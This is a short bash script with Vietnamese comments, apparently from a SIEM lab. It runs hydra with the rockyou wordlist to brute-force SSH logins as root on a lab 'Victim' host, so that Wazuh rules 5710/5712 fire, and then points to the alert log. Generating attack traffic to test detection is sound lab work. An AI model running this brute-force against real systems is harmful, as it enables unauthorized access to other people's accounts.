#!/usr/bin/env bash
# SSH brute-force vào Victim — kích rule Wazuh 5710/5712 (multiple auth failures).
# Chạy từ Kali: bash ssh-bruteforce.sh <VICTIM_IP>
set -euo pipefail

TARGET="${1:-192.168.100.20}"
USER="${2:-root}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
ATTEMPTS="${4:-20}"

command -v hydra >/dev/null || { echo "!! Chưa có hydra. apt install hydra"; exit 1; }

echo "[*] SSH brute-force → $TARGET (user: $USER, $ATTEMPTS attempts)"
echo "[*] Rule Wazuh dự kiến: 5710 (auth fail), 5712 (nhiều lần liên tiếp)"

# Giới hạn task để không đánh quá lâu
hydra -l "$USER" -P "$WORDLIST" -t 4 -F -u "ssh://$TARGET" -V 2>&1 | head -n "$ATTEMPTS"

echo "[✓] Xong. Kiểm tra alert trên Wazuh Dashboard hoặc: tail -f /var/ossec/logs/alerts/alerts.json (trên SIEM)"
